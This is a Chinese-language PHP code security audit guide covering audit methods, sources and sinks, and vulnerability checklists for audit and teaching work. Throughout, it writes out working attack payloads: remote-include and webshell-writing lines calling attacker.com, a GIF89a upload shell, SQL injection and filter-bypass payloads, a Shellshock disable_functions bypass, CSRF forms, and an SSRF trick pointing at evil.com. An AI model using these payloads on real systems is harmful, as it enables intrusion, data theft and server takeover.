# PHP Security Audit

> PHP 代码安全审计模块 | **双轨并行完整覆盖**
> 适用于: PHP, Laravel, Symfony, WordPress, ThinkPHP

---

## 审计方法论

### 双轨并行框架

```
                      PHP 代码安全审计
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
         ▼                 ▼                 ▼
┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
│  轨道A (50%)    │ │  轨道B (40%)    │ │  补充 (10%)     │
│  控制建模法     │ │  数据流分析法   │ │  配置+依赖审计  │
│                 │ │                 │ │                 │
│ 缺失类漏洞:     │ │ 注入类漏洞:     │ │ • 硬编码凭据    │
│ • 认证缺失      │ │ • SQL注入       │ │ • 不安全配置    │
│ • 授权缺失      │ │ • 命令注入      │ │ • CVE依赖       │
│ • IDOR          │ │ • 文件包含      │ │                 │
│ • 竞态条件      │ │ • 反序列化      │ │                 │
└─────────────────┘ └─────────────────┘ └─────────────────┘
```

### 两轨核心公式

```
轨道A: 缺失类漏洞 = 敏感操作 - 应有控制
轨道B: 注入类漏洞 = Source → [无净化] → Sink
```

**参考文档**: `references/core/security_controls_methodology.md`, `references/core/data_flow_methodology.md`

---

# 轨道A: 控制建模法 (缺失类漏洞)

## A1. 敏感操作枚举

### 1.1 快速识别命令

```bash
# Laravel路由 - 数据修改操作
grep -rn "Route::post\|Route::put\|Route::delete\|Route::patch" --include="*.php"

# Laravel控制器方法
grep -rn "public function store\|public function update\|public function destroy" --include="*.php"

# 原生PHP数据修改
grep -rn "\$_POST\[.*delete\|\$_POST\[.*update\|\$_GET\[.*action" --include="*.php"

# 数据访问操作
grep -rn "Route::get.*{.*}\|public function show" --include="*.php"

# 批量操作
grep -rn "function export\|function download\|function batch" --include="*.php"

# 资金操作
grep -rn "transfer\|payment\|refund\|balance" --include="*.php"

# 外部HTTP请求
grep -rn "file_get_contents\|curl_\|Guzzle\|Http::get" --include="*.php"

# 文件操作
grep -rn "fopen\|file_put_contents\|move_uploaded_file" --include="*.php"

# 命令执行
grep -rn "exec\|system\|passthru\|shell_exec\|popen" --include="*.php"
```

### 1.2 输出模板

```markdown
## PHP敏感操作清单

| # | 端点/方法 | HTTP方法 | 敏感类型 | 位置 | 风险等级 |
|---|-----------|----------|----------|------|----------|
| 1 | /api/user/{id} | DELETE | 数据修改 | UserController.php:45 | 高 |
| 2 | /api/user/{id} | GET | 数据访问 | UserController.php:32 | 中 |
| 3 | /api/transfer | POST | 资金操作 | PaymentController.php:56 | 严重 |
```

---

## A2. 安全控制建模

### 2.1 PHP安全控制实现方式

| 控制类型 | Laravel | Symfony | 原生PHP |
|----------|---------|---------|---------|
| **认证控制** | `auth` middleware, `Auth::check()` | `@IsGranted`, Security | `session_start()`, 自定义 |
| **授权控制** | Gate, Policy, `@can` | Voters, `@IsGranted` | 手动检查 |
| **资源所有权** | Policy `$user->id === $post->user_id` | Voter | 手动比对 |
| **输入验证** | FormRequest, Validator | Form Validation | `filter_input()` |
| **并发控制** | `lockForUpdate()`, 事务 | Doctrine锁 | `SELECT FOR UPDATE` |
| **审计日志** | spatie/laravel-activitylog | EventDispatcher | 自定义 |

### 2.2 控制矩阵模板 (PHP)

```yaml
敏感操作: DELETE /api/user/{id}
位置: UserController.php:45
类型: 数据修改

应有控制:
  认证控制:
    要求: 必须登录
    Laravel: Route::middleware('auth') 或 $this->middleware('auth')

  授权控制:
    要求: 管理员或本人
    Laravel: Gate::authorize('delete', $user) 或 $this->authorize()
    Policy: UserPolicy@delete

  资源所有权:
    要求: 非管理员只能删除自己的数据
    验证: $user->id === Auth::id()
```

---

## A3. 控制存在性验证

### 3.1 数据修改操作验证清单

```markdown
## 控制验证: [端点名称]

| 控制项 | 应有 | Laravel实现 | 结果 |
|--------|------|-------------|------|
| 认证控制 | 必须 | middleware('auth') | ✅/❌ |
| 授权控制 | 必须 | Gate/Policy | ✅/❌ |
| 资源所有权 | 必须 | Policy检查 | ✅/❌ |
| 输入验证 | 必须 | FormRequest | ✅/❌ |

### 验证命令
```bash
# 检查路由中间件
grep -A 5 "Route::delete\|Route::post" routes/api.php | grep "middleware"

# 检查控制器授权
grep -A 10 "public function destroy" [Controller文件] | grep "authorize\|Gate::\|can("
```
```

### 3.2 常见缺失模式 → 漏洞映射

| 缺失控制 | 漏洞类型 | CWE | PHP检测方法 |
|----------|----------|-----|-------------|
| 无auth中间件 | 认证缺失 | CWE-306 | 检查路由middleware |
| 无Gate/Policy | 授权缺失 | CWE-862 | 检查authorize调用 |
| 无user_id比对 | IDOR | CWE-639 | 检查查询条件 |
| 无lockForUpdate | 竞态条件 | CWE-362 | 检查资金操作事务 |

---

# 轨道B: 数据流分析法 (注入类漏洞)

> **核心公式**: Source → [无净化] → Sink = 注入类漏洞

## B1. PHP Source

```php
$_GET['name']
$_POST['name']
$_REQUEST['name']
$_COOKIE['session']
$_SERVER['HTTP_X_HEADER']
$_FILES['file']
file_get_contents('php://input')
```

## B2. PHP Sink

| Sink类型 | 漏洞 | CWE | 危险函数 |
|----------|------|-----|----------|
| SQL执行 | SQL注入 | 89 | mysqli_query, ->query() |
| 命令执行 | 命令注入 | 78 | system, exec, passthru |
| 代码执行 | 代码注入 | 94 | eval, assert |
| 文件包含 | LFI/RFI | 98 | include, require |
| 反序列化 | RCE | 502 | unserialize |
| 文件操作 | 路径遍历 | 22 | file_get_contents |

## B3. Sink检测命令

## 识别特征

```php
<?php
// PHP项目识别
// Laravel/Symfony/WordPress等

// 文件结构 (Laravel)
├── composer.json
├── artisan
├── app/
│   ├── Http/Controllers/
│   ├── Models/
│   └── Providers/
├── routes/
├── resources/views/
└── config/
```

---

## 代码审计思路

### 四种审计方法

| 方法 | 描述 | 优点 | 缺点 |
|-----|------|-----|------|
| 逆向追踪(回溯变量) | 搜索敏感函数，回溯参数来源 | 快速定向挖掘 | 逻辑漏洞覆盖不全 |
| 正向追踪(跟踪变量) | 从输入点跟踪变量传递过程 | 挖掘更全面 | 速度较慢 |
| 功能点审计 | 根据经验直接审计常见漏洞功能 | 针对性强 | 依赖经验 |
| 通读全文 | 完整阅读所有代码 | 发现逻辑漏洞 | 耗时长 |

### 通读全文关键文件

```
1. index文件 - 程序入口，了解整体架构
2. 函数集文件 - functions/common等，公共函数
3. 配置文件 - config，注意单引号/双引号
4. 安全过滤文件 - filter/safe/check，过滤逻辑
5. 数据库类文件 - db/database，检查连接方式(宽字节)
6. 路由文件 - router，理解URL解析方式
```

### 过滤逻辑错误

```php
// 示例1: 条件判断错误导致绕过
// index.php
$p = $_GET['p'];

// global.php
foreach($_GET as $key => $value) {
    StopAttack($key, $value, $getfilter);  // 过滤GET
}

// 过滤POST但条件错误
if($_GET['p'] !== 'admin') {  // 当p=admin时不过滤POST!
    foreach($_POST as $key => $value) {
        StopAttack($key, $value, $postfilter);
    }
}

// 后面的代码会覆盖$p
foreach($_GET as $key => $value) {
    $$key = addslashes($value);  // $p被重新赋值
}

// Bypass: ?p=admin + POST注入数据绕过POST过滤

// 示例2: 过滤顺序错误
// 先过滤后赋值
$data = $_POST['data'];
$data = htmlspecialchars($data);  // 过滤
// ...
$data = $_POST['data'];  // 重新赋值,覆盖过滤结果!

// 示例3: extract导致变量覆盖过滤
$admin = false;
// 进行了过滤
$input = htmlspecialchars($_POST['input']);

extract($_POST);  // 变量覆盖!
// ?admin=true 绕过权限验证
```

---

## 用户输入获取

```php
// 获取用户输入的超全局变量
$_GET['param']              // URL查询参数
$_POST['param']             // POST数据
$_COOKIE['param']           // Cookie数据
$_REQUEST['param']          // GET+POST+COOKIE
$_FILES['file']             // 上传文件
$_SERVER['PHP_SELF']        // 当前执行页面
$_SERVER['REQUEST_URI']     // 请求URI
$_SERVER['QUERY_STRING']    // 查询字符串
$_SERVER['HTTP_HOST']       // 请求主机
$_SESSION['param']          // Session数据

// 旧版本(已废弃)
$HTTP_GET_VARS
$HTTP_POST_VARS
$HTTP_COOKIE_VARS
```

---

## 代码执行

### 直接执行函数

```php
// 高危函数
eval($userInput);                    // RCE!
assert($userInput);                  // RCE (PHP < 7.2)
create_function('', $userInput);     // RCE (已弃用)
preg_replace('/e', $userInput);      // RCE (PHP < 7.0)

// 回调函数执行
call_user_func($func, $arg);         // 动态调用函数
call_user_func_array($func, $args);  // 动态调用函数
array_map($func, $arr);              // 数组映射
array_filter($arr, $func);           // 数组过滤
usort($arr, $func);                  // 排序回调
```

### 命令执行

```php
// 命令执行函数
system($cmd);                // 执行命令，输出结果
exec($cmd, $output);         // 执行命令，返回最后一行
shell_exec($cmd);            // 执行命令，返回完整输出
passthru($cmd);              // 执行命令，直接输出
`$cmd`;                      // 反引号执行
popen($cmd, 'r');            // 打开进程
proc_open($cmd, ...);        // 高级进程控制
pcntl_exec($path);           // 执行程序
```

### 搜索模式

```regex
eval\s*\(|assert\s*\(|create_function\s*\(
preg_replace\s*\(.*\/.*e
system\s*\(|exec\s*\(|shell_exec\s*\(|passthru\s*\(
popen\s*\(|proc_open\s*\(|pcntl_exec\s*\(
call_user_func|array_map|array_filter
```

---

## 文件包含

### 本地文件包含 (LFI)

```php
// 危险函数
include($file);        // 包含文件，失败警告
include_once($file);   // 只包含一次
require($file);        // 包含文件，失败致命错误
require_once($file);   // 只包含一次

// 截断技巧 (PHP < 5.3)
?file=../../../etc/passwd%00           // Null字节截断
?file=../../../etc/passwd...[259字符]   // 路径长度截断(Windows)
?file=../../../etc/passwd...[4096字符]  // 路径长度截断(Linux)
```

### 远程文件包含 (RFI)

```php
// 需要配置
allow_url_fopen = On   // 允许fopen/file_get_contents等访问URL
allow_url_include = On // 允许include/require包含URL

// 远程包含
include("http://attacker.com/shell.txt");

// ?号截断(不受版本限制)
?file=http://attacker.com/shell.txt?
```

### PHP伪协议

| 协议 | 用途 | 配置要求 |
|-----|------|---------|
| file:// | 访问本地文件 | 无 |
| php://filter | 读取源码(base64编码) | 无 |
| php://input | 读取POST原始数据 | allow_url_include=On |
| data:// | 数据流 | allow_url_include=On |
| phar:// | PHP归档(可触发反序列化) | 无 |
| zip:// | ZIP压缩包 | 无 |
| expect:// | 执行命令 | 需安装expect扩展 |

```php
// 读取源码
php://filter/read=convert.base64-encode/resource=config.php

// 执行PHP代码
php://input + POST: <?php phpinfo();?>

// data协议执行
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

// 写入WebShell
php://input + POST: <?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]);?>');?>
```

---

## 反序列化漏洞

### 魔术方法

```php
__construct()      // 创建对象时触发
__destruct()       // 对象销毁时触发
__wakeup()         // unserialize时触发
__sleep()          // serialize时触发
__toString()       // 对象转字符串时触发
__call()           // 调用不可访问方法时触发
__callStatic()     // 静态调用不可访问方法时触发
__get()            // 读取不可访问属性时触发
__set()            // 写入不可访问属性时触发
__isset()          // 对不可访问属性调用isset/empty时触发
__unset()          // 对不可访问属性调用unset时触发
__invoke()         // 对象当函数调用时触发
```

### __toString触发场景

```
1. echo/print对象时
2. 对象与字符串连接时
3. 格式化字符串时
4. 对象与字符串==比较时
5. SQL语句绑定参数时
6. strlen/addslashes等字符串函数
7. in_array()第一个参数是对象时
8. class_exists()参数是对象时
```

### 序列化格式

```php
// 格式: O:类名长度:"类名":属性个数:{属性}
O:4:"test":2:{s:4:"name";s:5:"admin";s:3:"age";i:18;}

// 变量修饰符影响
public    -> 正常: s:4:"name"
private   -> 加类名: s:10:"\x00test\x00name"  (类名前后有\x00)
protected -> 加*:    s:7:"\x00*\x00name"       (*前后有\x00)

// 大写S支持十六进制编码
s:4:"user" -> S:4:"use\72"  // \72 = r
```

### 绕过技巧

```php
// 绕过__wakeup (CVE-2016-7124)
// 属性个数大于真实属性个数时跳过__wakeup
O:4:"test":1:{s:4:"file";s:8:"flag.php";}  // 正常
O:4:"test":2:{s:4:"file";s:8:"flag.php";}  // 绕过

// 深浅拷贝绕过过滤
$A = &$B;  // A和B指向同一地址，B改变A也改变
```

### phar反序列化

```php
// 触发phar反序列化的函数
file_exists()
is_file()
is_dir()
filesize()
file_get_contents()
fopen()
include/require

// 利用方式
file_exists('phar://uploads/evil.phar');
```

### 攻击链构造

```php
// 常用sink函数
命令执行: exec(), passthru(), popen(), system()
文件操作: file_put_contents(), file_get_contents(), unlink()
代码执行: eval(), assert(), call_user_func()
```

---

## SQL注入

### 注入类型

```php
// 字符型注入
$sql = "SELECT * FROM users WHERE id='$id'";  // 需要闭合引号
// Payload: ?id=-1' union select 1,user(),3-- +

// 数字型注入
$sql = "SELECT * FROM users WHERE id=$id";    // 无需引号,addslashes无效
// Payload: ?id=-1 union select 1,user(),3-- +

// 搜索型注入
$sql = "SELECT * FROM users WHERE name LIKE '%$name%'";
// Payload: ?name=%' union select 1,2,3-- +
```

### 编码绕过

```php
// Base64编码绕过 (魔术引号无效)
$id = base64_decode($_GET['id']);
$sql = "SELECT * FROM users WHERE id='$id'";
// Payload: ?id=JyB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyAtLSAr (base64编码后)

// URL编码绕过 (双重解码)
$id = urldecode($_GET['id']);  // 只会被url解码一次
$sql = "SELECT * FROM users WHERE id='$id'";
// Payload: ?id=%2527union%20select%201,user(),3--%20+ (%2527->%27->')

// 宽字节注入
$conn = mysql_connect('localhost', 'root', 'root');
mysql_select_db("security", $conn);
mysql_query("set names 'gbk'", $conn);  // 设置为GBK编码
$id = addslashes($_GET['id']);  // ' 被转义为 \'
$sql = "SELECT * FROM users WHERE id='$id'";
// Payload: ?id=1%df' -> 1%df%5c%27 -> 1運' (绕过转义)
// 原理: %df%5c 在GBK中是汉字 '運'
```

### 过滤绕过技巧

```php
// 双写绕过 (替换为空)
if(preg_match('/union/i', $input)) {
    $input = str_replace('union', '', $input);  // 替换为空
}
// Payload: ununionion -> union (第一个union被替换)

// 注释绕过空格
/**/union/**/select/**/  // 多行注释代替空格
+union+select+           // 加号代替空格

// 内联注释绕过关键字
/*!union*//*!select*/    // MySQL内联注释
```

### 二次注入

```php
// 第一步: 插入恶意数据 (被转义存入数据库)
$username = addslashes($_POST['username']);  // admin' or '1'='1
$sql = "INSERT INTO users (username) VALUES ('$username')";
// 实际存入数据库: admin\' or \'1\'=\'1

// 第二步: 取出后未转义直接使用
$username = $row['username'];  // admin' or '1'='1 (取出后反转义)
$sql = "SELECT * FROM users WHERE username='$username'";
// 产生注入: SELECT * FROM users WHERE username='admin' or '1'='1'
```

### 常见函数

```php
// MySQL
mysql_query($sql);           // 已废弃
mysqli_query($conn, $sql);
$pdo->query($sql);

// PostgreSQL
pg_query($conn, $sql);

// MSSQL
mssql_query($sql);
```

### 防护绕过

```php
// addslashes绕过
1. 数字型注入不需要引号
2. 宽字节注入(GBK编码)
3. 二次注入(入库后再取出使用)
4. 编码绕过(base64_decode、urldecode等)

// intval绕过
1. 使用科学计数法: 1e1 = 10
2. 使用进制: 0x1a = 26

// 正则过滤绕过
1. 大小写绕过: UnIoN SeLeCt
2. 双写绕过: ununionion
3. 注释绕过: /*!union*/
4. 编码绕过: %75%6e%69%6f%6e (union的URL编码)
```

---

## 文件上传

### 绕过方法

```php
// 后缀绕过
.php3/.php4/.php5/.php7/.phtml/.phar/.phps/.pht
.PhP/.pHP/.PHp  // 大小写
.php.jpg        // 双后缀
.php%00.jpg     // Null字节 (PHP < 5.3)
.php/.          // 路径截断

// MIME绕过
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg

// 文件头绕过
GIF89a;<?php system($_GET['cmd']);?>

// .htaccess上传
AddType application/x-httpd-php .jpg  // 让.jpg解析为PHP

// IIS特性 (IIS 6)
shell.asp;.jpg
folder.asp/file.txt
```

### PHP后缀列表

```
.php .pht .phtm .phtml .phar .phpt .pgif .phps
.php2 .php3 .php4 .php5 .php6 .php7 .php16 .inc
```

### 检测函数

```php
move_uploaded_file($_FILES['file']['tmp_name'], $path);
```

---

## 变量覆盖

### 危险函数

```php
// extract函数
extract($_GET);        // 将GET参数注册为变量
extract($_POST);
extract($_REQUEST);

// parse_str函数(无第二参数)
parse_str($_SERVER['QUERY_STRING']);  // 解析查询字符串到变量

// import_request_variables (PHP 4.1-5.4)
import_request_variables('GP');  // 导入GET/POST变量

// $$可变变量
foreach($_GET as $key => $value) {
    $$key = $value;  // 将$key的值作为变量名
}

// register_globals (已移除)
```

### 示例

```php
// 变量覆盖导致权限绕过
$admin = false;
extract($_GET);  // ?admin=1 导致$admin=1
if($admin) { /* 管理员操作 */ }
```

---

## 弱类型比较

### == vs ===

```php
// == 会类型转换
"0e123" == "0e456"   // true (都解析为0)
"0" == false         // true
"1abc" == 1          // true
"abc" == 0           // true

// === 严格比较
"0e123" === "0e456"  // false
"0" === false        // false
```

### 函数特性

```php
// in_array (无第三参数)
in_array("1abc", [0,1,2]);  // true ("1abc"转为1)

// is_numeric
is_numeric("0x1a");  // true (16进制)
is_numeric("1e2");   // true (科学计数法)

// strcmp (PHP < 5.3)
strcmp([], "password");  // 0 (数组比较返回NULL,转为0)

// switch
switch("1abc") { case 1: ... }  // 匹配case 1

// preg_match (无^$)
preg_match('/admin/', "123admin456");  // 匹配成功
```

### 0e开头MD5

```
QNKCDZO -> 0e830400451993494058024219903391
s878926199a -> 0e545993274517709034328855841020
s155964671a -> 0e342768416822451524974117254469
```

---

## 函数缺陷

### escapeshellarg + escapeshellcmd

```php
// 组合使用产生漏洞
$param = "127.0.0.1' -v -d a=1";
$ep = escapeshellarg($param);     // '127.0.0.1'\'' -v -d a=1'
$eep = escapeshellcmd($ep);       // '127.0.0.1'\\'' -v -d a=1\'
// 单引号逃逸，可注入额外参数
```

### filter_var绕过

```php
// FILTER_VALIDATE_URL绕过
filter_var("javascript://alert(1)", FILTER_VALIDATE_URL);  // true
filter_var("0://1", FILTER_VALIDATE_URL);                  // true

// SSRF绕过
$url = "0://evil.com:80,target.com:80/";
// curl会访问evil.com
```

### parse_url tricks

```php
// 端口解析
parse_url("/baidu.com:80");      // false
parse_url("/baidu.com:80a");     // path: /baidu.com:80a

// 路径解析
parse_url("//upload?/test/");    // host: upload?, path: /test/
parse_url("///upload?id=1");     // false (三斜杠解析失败)

// 用户名解析
parse_url("http://a..@target.com/..//");  // host: target.com
```

### file_put_contents

```php
// 数组绕过正则
if(preg_match('/\</', $data)) die('hack');
file_put_contents($file, $data);
// 传入 content[]=<?php phpinfo();?> 绕过

// 文件名绕过
file_put_contents("1.php/../1.php", $content);  // 绕过正则
file_put_contents("2.php/.", $content);         // 绕过正则
file_put_contents("xxx/../index.php/.", $content);  // 覆盖文件(Linux)
```

---

## bypass disable_functions

### 方法

```
1. 加载so扩展模块
2. 使用未禁用的生僻函数
3. 利用第三方漏洞(CVE-2014-6271 Shellshock)
4. LD_PRELOAD劫持
5. PHP-FPM/FastCGI攻击
```

### mail函数利用 (Shellshock)

```php
// CVE-2014-6271 破壳漏洞
function shellshock($cmd) {
    $tmp = tempnam(".", "data");
    putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
    mail("a@127.0.0.1", "", "", "", "-bv");
    $output = @file_get_contents($tmp);
    @unlink($tmp);
    return $output;
}
```

---

## PHP配置安全

### 危险配置

```ini
allow_url_fopen = On        ; 允许fopen访问URL
allow_url_include = On      ; 允许include包含URL
display_errors = On         ; 显示错误信息
expose_php = On             ; 暴露PHP版本
register_globals = On       ; 全局变量注册(已移除)
magic_quotes_gpc = On       ; 魔术引号(已移除)
```

### 安全配置

```ini
disable_functions = exec,system,shell_exec,passthru,popen,proc_open
open_basedir = /var/www/html/  ; 限制文件访问目录
expose_php = Off
display_errors = Off
log_errors = On
```

---

## Laravel特定

```php
// 危险: DB::raw
DB::select("SELECT * FROM users WHERE id = " . $id);  // SQLi!
User::whereRaw("id = " . $id);  // SQLi!
User::orderByRaw($order);       // SQLi!

// 危险: Blade未转义
{!! $userInput !!}  // XSS!

// 安全: 自动转义
{{ $userInput }}

// 配置检查
APP_DEBUG=true      // 生产环境应为false
APP_KEY=base64:xxx  // 检查密钥强度

// Mass Assignment
protected $guarded = [];  // 危险: 允许批量赋值所有字段
```

---

## XSS审计

### 输出函数

```php
echo $userInput;
print $userInput;
print_r($userInput);
<?= $userInput ?>
printf("%s", $userInput);
```

### 过滤函数

```php
htmlspecialchars($str);           // 转义HTML特殊字符
htmlentities($str);               // 转义所有HTML实体
strip_tags($str);                 // 删除HTML标签
addslashes($str);                 // 转义引号(不防XSS)
```

---

## 逻辑漏洞审计

### 越权访问

```php
// 1. 后台越权 - 缺少权限验证文件
// admin/delete.php
// 危险: 未包含验证文件
$id = $_GET['id'];
$sql = "DELETE FROM users WHERE id=$id";
mysqli_query($conn, $sql);

// 安全: 包含验证
require '../inc/checklogin.php';  // 验证登录状态

// 2. 水平越权 - 未验证资源所有权
// user/edit_profile.php
$uid = $_POST['uid'];  // 用户可控!
$name = $_POST['name'];
$sql = "UPDATE users SET name='$name' WHERE uid=$uid";
// 危险: 可以修改其他用户资料

// 安全: 验证所有权
$uid = $_SESSION['uid'];  // 使用session中的uid
if($uid != $_POST['uid']) {
    die('Access denied');
}

// 3. 垂直越权 - 低权限用户访问高权限功能
function deleteUser($uid) {
    // 危险: 未验证操作者权限
    $sql = "DELETE FROM users WHERE uid=$uid";
}

// 安全: 验证权限等级
function deleteUser($uid) {
    if($_SESSION['role'] != 'admin') {  // 验证是否为管理员
        die('Permission denied');
    }
    $sql = "DELETE FROM users WHERE uid=$uid";
}
```

### Cookies验证不严

```php
// checklogin.php
// 危险: 仅验证cookie存在
if(empty($_COOKIE['user'])) {
    header('Location: login.php');
    exit;
}
// 只要设置了cookie就能访问后台!

// 安全: 验证session
session_start();
if(!isset($_SESSION['uid']) || !isset($_SESSION['username'])) {
    header('Location: login.php');
    exit;
}
// 并且验证session中的签名
if($_SESSION['sign'] != md5($_SESSION['uid'] . SECRET_KEY)) {
    die('Invalid session');
}
```

### 安装程序逻辑缺陷

```php
// install/index.php
// 危险: 判断后未退出
if(file_exists('../data/install.lock')) {
    header('Location: ../index.php');  // 跳转但未退出
    // 下面的代码继续执行!
}

// 接收安装参数
$dbhost = $_POST['dbhost'];
$dbuser = $_POST['dbuser'];
// ... 执行安装
// 直接POST数据即可绕过锁定文件检测

// 安全: 正确退出
if(file_exists('../data/install.lock')) {
    header('Location: ../index.php');
    exit();  // 或 die();
}
```

### 支付逻辑漏洞

```php
// 危险: 客户端控制金额
$price = $_POST['price'];  // 用户可修改!
$orderNo = $_POST['order_no'];

// 危险: 未验证回调签名
$status = $_GET['status'];
if($status == 'success') {
    // 直接标记订单为已支付
    updateOrderStatus($orderNo, 'paid');
}

// 安全: 服务端验证
$orderInfo = getOrder($orderNo);
$actualPrice = $orderInfo['price'];  // 从数据库获取真实价格

// 验证支付平台签名
$sign = md5($orderNo . $actualPrice . SECRET_KEY);
if($_GET['sign'] != $sign) {
    die('Invalid sign');
}
```

---

## CSRF审计

### 基本检测

```
检查点:
1. 是否有token验证
2. 删除referer是否能访问
3. token是否可预测
4. token是否在cookie和表单同时验证
5. 是否验证请求方法(GET/POST)
```

### CSRF类型

```php
// GET型CSRF (危险性最大)
// delete.php?id=1  - 直接访问链接即可触发
<img src="http://victim.com/delete.php?id=1">  // 受害者访问即删除

// POST型CSRF
<form action="http://victim.com/delete.php" method="POST" id="csrf">
    <input type="hidden" name="id" value="1">
</form>
<script>
    document.getElementById('csrf').submit();
</script>
```

### CSRF组合利用

```php
// CSRF + 代码执行 (后台模板编辑)
// 1. 构造CSRF表单
<form action="http://admin.com/template/save.php" method="POST">
    <input name="content" value="{if:assert(phpinfo())}x{end if}">
</form>
<script>document.forms[0].submit();</script>

// 2. 利用XSS触发CSRF
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '/admin/delete.php');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('id=1');
</script>

// 3. 利用iframe触发
<iframe src="http://admin.com/csrf.html" style="display:none"></iframe>
```

### 防护绕过

```php
// Referer验证绕过
// 1. 数据伪造
Referer: http://victim.com.attacker.com/  // 包含受信域名

// 2. 删除Referer头
// 某些配置下删除referer可以绕过检测

// Token验证绕过
// 1. Token未与session绑定
// 2. Token可预测(md5(timestamp))
// 3. Token可重放使用
```

---

## 文件操作审计

### 任意文件删除

```php
// 危险: 未验证文件路径
function deleteFile($filename) {
    if(file_exists($filename)) {
        unlink($filename);  // 任意文件删除!
    }
}

// 危险: 路径拼接不当
$path = $_POST['path'];  // /upload/../install/install.lock
unlink($path);  // 删除安装锁定文件导致重装

// 安全: 限制删除目录
function safeDelete($filename) {
    $basedir = '/var/www/uploads/';
    $filepath = realpath($basedir . $filename);

    // 检查是否在允许目录内
    if(strpos($filepath, $basedir) !== 0) {
        die('Invalid path');
    }

    // 检查后缀白名单
    $ext = pathinfo($filepath, PATHINFO_EXTENSION);
    if(!in_array($ext, ['jpg', 'png', 'gif', 'txt'], true)) {
        die('Not allowed');
    }

    unlink($filepath);
}
```

### 任意文件下载

```php
// 危险: 直接使用用户输入
$file = $_GET['file'];  // ../../../../etc/passwd
readfile($file);  // 读取任意文件

// 危险: 数据库取路径未验证
$file = $row['filepath'];  // D:/phpstudy/WWW/config.php
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename=' . basename($file));
readfile($file);  // 任意文件下载

// 安全: 完整防护
function safeDownload($fileId) {
    $allowDir = '/var/www/downloads/';

    // 从数据库获取路径
    $filepath = getFilePathFromDB($fileId);

    // 规范化路径
    $realpath = realpath($filepath);

    // 检查路径是否在允许目录内
    if(strpos($realpath, $allowDir) !== 0) {
        die('Access denied');
    }

    // 检查后缀白名单
    $ext = pathinfo($realpath, PATHINFO_EXTENSION);
    if(!in_array($ext, ['pdf', 'doc', 'docx', 'xls'], true)) {
        die('Not allowed');
    }

    // 安全下载
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($realpath));
    readfile($realpath);
}
```

### 文件操作函数

```php
// 读取
fopen($file, 'r');
file_get_contents($file);  // 任意文件读取
readfile($file);           // 任意文件读取
file($file);
fgets($fp);
fread($fp, $length);

// 写入
fwrite($fp, $data);
file_put_contents($file, $data);

// 删除
unlink($file);   // 任意文件删除
rmdir($dir);

// 其他
copy($src, $dst);
rename($old, $new);
parse_ini_file($file);
```

### 路径遍历防护

```php
// 危险字符
../          // 目录穿越
..\          // Windows目录穿越
..%2f        // URL编码
..%5c        // URL编码

// 防护方法
function secureFilePath($filename, $basedir) {
    // 移除危险字符
    $filename = str_replace(['../', '.\\', '%00'], '', $filename);

    // 拼接路径
    $filepath = $basedir . $filename;

    // 获取真实路径
    $realpath = realpath($filepath);

    // 验证是否在基础目录内
    if(strpos($realpath, realpath($basedir)) !== 0) {
        return false;
    }

    return $realpath;
}
```

---

## PHP审计清单

```
全局过滤:
- [ ] 检查 index.php 入口文件
- [ ] 检查 functions/common 公共函数
- [ ] 检查 config 配置文件(单双引号)
- [ ] 检查 filter/safe 过滤逻辑
- [ ] 检查数据库连接编码(宽字节)
- [ ] 测试 $_GET/$_POST 是否有全局过滤

代码执行:
- [ ] 搜索 eval/assert/create_function
- [ ] 搜索 preg_replace /e 模式
- [ ] 搜索 call_user_func/array_map等回调
- [ ] 搜索 system/exec/shell_exec/passthru
- [ ] 搜索 popen/proc_open/pcntl_exec
- [ ] 检查模板标签解析 (自定义标签)

文件包含:
- [ ] 搜索 include/require + 变量
- [ ] 检查 allow_url_include 配置
- [ ] 检查 allow_url_fopen 配置
- [ ] 检查伪协议使用 (php://、data://、phar://)
- [ ] 检查路径拼接 (../)
- [ ] 检查 NULL 字节截断 (PHP < 5.3)

反序列化:
- [ ] 搜索 unserialize
- [ ] 搜索 phar:// 使用
- [ ] 审计魔术方法利用链
- [ ] 检查 __wakeup 绕过
- [ ] 搜索 file_exists/is_file/filesize

SQL注入:
- [ ] 搜索原生SQL查询 (mysql_query/mysqli_query)
- [ ] 检查ORM raw方法
- [ ] 验证预处理语句
- [ ] 检查数据库编码 (set names 'gbk' -> 宽字节)
- [ ] 搜索 base64_decode + SQL
- [ ] 搜索 urldecode + SQL
- [ ] 检查二次注入场景
- [ ] 搜索 intval/is_numeric 使用
- [ ] 检查过滤函数 (addslashes/mysql_real_escape_string)

文件上传:
- [ ] 搜索 move_uploaded_file
- [ ] 检查黑名单/白名单
- [ ] 检查MIME验证 (可伪造)
- [ ] 检查文件头验证 (GIF89a绕过)
- [ ] 检查文件名过滤 (.php3/.phtml/.phar)
- [ ] 检查 .htaccess 上传
- [ ] 检查文件大小限制

文件操作:
- [ ] 搜索 unlink (任意文件删除)
- [ ] 搜索 readfile/file_get_contents (任意文件读取)
- [ ] 搜索 file_put_contents (任意文件写入)
- [ ] 检查路径拼接 (../绕过)
- [ ] 检查 realpath 验证
- [ ] 检查文件操作白名单
- [ ] 搜索 fopen/fread/fwrite
- [ ] 搜索 copy/rename

变量覆盖:
- [ ] 搜索 extract($_
- [ ] 搜索 parse_str(
- [ ] 搜索 import_request_variables
- [ ] 搜索 $$可变变量
- [ ] 检查变量初始化顺序
- [ ] 检查 foreach + $$ 模式

弱类型:
- [ ] 检查 == 比较 (应使用 ===)
- [ ] 检查 in_array 第三参数
- [ ] 检查 strcmp 数组绕过
- [ ] 检查 switch 类型转换
- [ ] 检查 is_numeric (0x/1e)
- [ ] 检查 preg_match (无 ^$)
- [ ] 搜索 0e 开头 MD5 比较

XSS:
- [ ] 搜索 echo/print/print_r + 变量
- [ ] 搜索 <?= $变量 ?>
- [ ] 检查 htmlspecialchars/htmlentities 使用
- [ ] 检查 strip_tags 使用
- [ ] 搜索 printf/sprintf

CSRF:
- [ ] 检查是否有 token 验证
- [ ] 删除 Referer 测试
- [ ] 检查 token 是否可预测
- [ ] 检查 GET 型危险操作
